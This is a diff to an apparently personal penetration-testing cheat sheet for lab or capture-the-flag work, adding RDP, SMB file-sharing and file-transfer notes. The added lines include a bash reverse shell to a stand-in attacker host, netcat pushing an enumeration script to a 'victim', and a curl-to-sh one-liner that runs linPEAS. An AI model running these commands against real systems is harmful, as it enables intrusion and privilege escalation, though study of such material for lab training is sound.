@@ -32,6 +32,8 @@ nmap -sn 192.168.0.0/16
 #  List the visibles NFS shares
 usr/sbin/showmount -e [IP]
 
+smbclient -L [IP]
+
 # Mount a folder
 mkdir /tmp/mount
 sudo mount -t nfs [IP]:/home /tmp/mount -nolock
@@ -93,3 +95,50 @@ hashcat -h | grep sha512crypt
 ```bash
 hashcat -m 21400 hash.txt /usr/share/wordlists/rockyou.txt
 ```
+
+
+## RDP
+
+```bash
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.135.207
+```
+
+```bash
+remmina
+```
+
+## Share
+
+
+
+Start a share
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+```
+
+On the victim machine
+
+```bash
+copy \\[ATTACKER_IP]\kali\somefile /path/somefile
+```
+
+
+### Send file to a machine
+```bash
+nc -w -3 [VICTIM_IP] [PORT] < LinEnum.sh
+```
+
+### Connect from server to local machine
+```bash
+# in bash script
+/bin/bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1
+```
+
+### Run linepeas in one line
+
+```bash
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+```
+
+
